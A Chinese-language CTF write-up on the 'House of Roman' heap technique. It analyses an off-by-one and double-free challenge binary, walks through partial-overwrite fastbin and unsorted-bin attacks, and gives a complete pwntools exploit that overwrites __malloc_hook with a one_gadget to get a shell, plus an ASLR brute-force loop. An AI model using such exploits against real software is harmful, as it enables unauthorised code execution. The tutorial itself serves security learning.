---
title: "House of Roman"
Categories:
    - Pwn
tag:
    - Pwn
    - Heap_Overflow
    - House_of_XXX
---

简单来说，就是没有功能供你打印出泄露的 libc / heap / text 的地址，现在你通过部分覆盖与爆破来修改你所泄露出的信息。

<!-- more -->

这里使用原作者提供的[二进制](https://github.com/romanking98/House-Of-Roman)文件来讲解，为了讲解简单方便，同时为了理解更容易我们先关掉 ASLR。

```shell
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```

先检查保护

```shell
root@ubuntu:~/Desktop/House of Roman# checksec new_chall
[*] '/root/Desktop/House of Roman/new_chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO 
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 程序分析

程序提供了三个功能，申请、修改、释放：

```c
// main()
__isoc99_scanf("%d", &choice);
switch ( choice )
{
    case 1:
        puts("Malloc");
        v4 = malloc_chunk();
        if ( !v4 )
            puts("Error");
        break;
    case 2:
        puts("Write");
        write_chunk();
        break;
    case 3:
        puts("Free");
        free_chunk();
        break;
    default:
        puts("Invalid choice");
        break;
}

// malloc_chunk()
// 申请大小随意
printf("Enter size of chunk :");
__isoc99_scanf("%d", &size);
printf("Enter index :", &size);
__isoc99_scanf("%d", &idx);
if ( idx <= 0x13 ) {
    ptr = malloc(size);
    *(&size + 4) = ptr;
    heap_ptrs[idx] = ptr;
    sizes[idx] = size;
    result = *(&size + 4);
}
else {
    puts("Invalid index");
    result = 0LL;
}
return result;

// write_chunk()
// 存在 off by one
printf("\nEnter index of chunk :");
__isoc99_scanf("%d", &idx);
if ( idx > 0x13 )
    return puts("\nInvalid index");
if ( !heap_ptrs[idx] )
    return puts("Bad index");
size = sizes[idx];
printf("Enter data :", &idx);
return read(0, heap_ptrs[idx], size + 1);   // off by one

// free_chunk()
// 释放时未对 heap_ptr 进行检验，存在 Double Free
// 释放后未对 heap_ptr 清零，存在 UAF
printf("\nEnter index :");
__isoc99_scanf("%d", &idx);
if ( idx <= 0x13 )
free(heap_ptrs[idx]);
```

## 利用思路

先申请3个 chunk，chunk 大小分别是 0x20、0xd0、0x70，chunk_0 用来修改 chunk_1 大小，chunk_1 用来获取 main_arena，chunk_2 保护它们不被合并到 top_chunk。

```python
Malloc(0x18, 0)
Malloc(0xC8, 1)
Malloc(0x68, 2)
```

在 chunk_1 中伪造一个 chunk，作用是 fake size 用于后面的 fastbin attack。

```python
fake =  'A'*0x68
fake += p64(0x61)
Write(1, fake)
```

释放掉 chunk_1后再申请回来，chunk_1 过了一遍 unsorted bin，所以 chunk_1 的 fd、bk 里面就有 main_arena 的地址了。

```python
Free(1)
Malloc(0xC8, 1)
```

通过 chunk_0，利用 write_chunk() 里面的 off by one 将 chunk_1 的大小改为 0x71。

```python
over =  'A'*0x18
over += '\x71'
Write(0, over)
```

再分配3个 chunk，大小均为 0x70，chunk_3 与 chunk_2 一起实现 fastbin attack，chunk_4 用来修护攻击后的 fastbin，chunk_5 保护它们不被合并到 top_chunk。

```python
Malloc(0x68, 3)
Malloc(0x68, 4)
Malloc(0x68, 5)
```

以下代码就是进行 fastbin attack

```python
Free(2)
Free(3)
# chunbk_3 -> chunk_2

heap_po = '\x20'
Write(3, heap_po)
# chunk_3 -> chunk_1 -> main_arena

arena_po = "\xed\x1a"
Write(1, arena_po)
# chunk_3 -> chunk_1 -> main_arena - 0x23

Malloc(0x68, 3)
Malloc(0x68, 1)
Malloc(0x68, 0)
# chunk_0 = main_arena - 0x23

Free(4)
Write(4, '\x00')
# repair fastbin
```

利用 unsorted bin 修改 malloc_hook 内容为 main_arean 的地址

```python
Malloc(0xC8, 6)
Malloc(0x18, 7)

Free(6)
po =  'B'*8
po += "\x00\x1B"
Write(6, po)
Malloc(0xC8, 6)

over =  'C'*0x13
over += "\xa4\xd2\xaf"
Write(0, over)
```

最后通过触发 Double Free 来 getshell。

```python
Free(5)
Free(5)

io.interactive()
```

明明是 __攻击的 malloc_hook__  为什么 __不是用 malloc__ 来 get shell 而是 __用 Double Free__ 来 get shell？

先感谢 __@ShellM1ng__

![answer_0](/images/posts/House_of_Roman/answer_0.png)  
![answer_1](/images/posts/House_of_Roman/answer_1.png)  
![answer_2](/images/posts/House_of_Roman/answer_2.png)  

另外还有一点，虽然这个例子中我们没有用到。以前我们进行 fastbin 攻击时得目标地址附近有一个合适的大小，现在我们确实可以通过设置 unsorted bin 攻击的 0x7f 来将 fastbin 放在任何地方。

最后，上面是关掉 ASLR 来弄的，开启 ASLR 后，我们就多跑几次就成了。

```shell
#!/bin/bash
while true
do
    python exp.py
done
```

## 完整利用代码

```python
#!/usr/bin/python
from pwn import *

io = process("./new_chall")

def menu():
    io.recvuntil("3. Free\n")

def Malloc(size, idx):
    menu()
    io.sendline('1')
    io.recvuntil("Enter size of chunk :")
    io.sendline(str(size))
    io.recvuntil("Enter index :")
    io.sendline(str(idx))

def Write(idx, data):
    menu()
    io.sendline('2')
    io.recvuntil("Enter index of chunk :")
    io.sendline(str(idx))
    io.recvuntil("Enter data :")
    io.send(data)

def Free(idx):
    menu()
    io.sendline('3')
    io.recvuntil("Enter index :")
    io.sendline(str(idx))

name = 'A'*20
io.recvuntil("Enter name :")
io.send(name)

Malloc(0x18, 0)
Malloc(0xC8, 1)
Malloc(0x68, 2)

fake =  'A'*0x68
fake += p64(0x61)
Write(1, fake)

Free(1)
Malloc(0xC8, 1)

over =  'A'*0x18
over += '\x71'
Write(0, over)

Malloc(0x68, 3)
Malloc(0x68, 4)
Malloc(0x68, 5)

Free(2)
Free(3)

heap_po = '\x20'
Write(3, heap_po)

arena_po = "\xed\x1a"
Write(1, arena_po)

Malloc(0x68, 3)
Malloc(0x68, 0)
Malloc(0x68, 0)

Free(4)
Write(4, '\x00')

Malloc(0xC8, 6)
Malloc(0x18, 7)

Free(6)
po =  'B'*8
po += "\x00\x1B"
Write(6, po)
Malloc(0xC8, 6)

over =  'C'*0x13
# over += "\x16\x22\xa5"    # 0x45216
# over += "\x6a\x22\xaf"    # 0x4526a
over += "\xa4\xd2\xaf"    # 0xf02a4
# over += "\x47\xe1\xaf"    # 0xf1147
Write(0, over)

Free(5)
Free(5)

io.recvuntil(" ***")
io.sendline("uname -a")
data = io.recvuntil("GNU/Linux", timeout=2)
if "Linux" in data:
    io.interactive()
else:
    io.close()

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
```

## 参考资料

+ romanking98. [House of Roman](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc)
+ romanking98. [bin, libc & exp](https://github.com/romanking98/House-Of-Roman)
+ hackedbylh. [House of Roman 实战](https://xz.aliyun.com/t/2316#toc-0)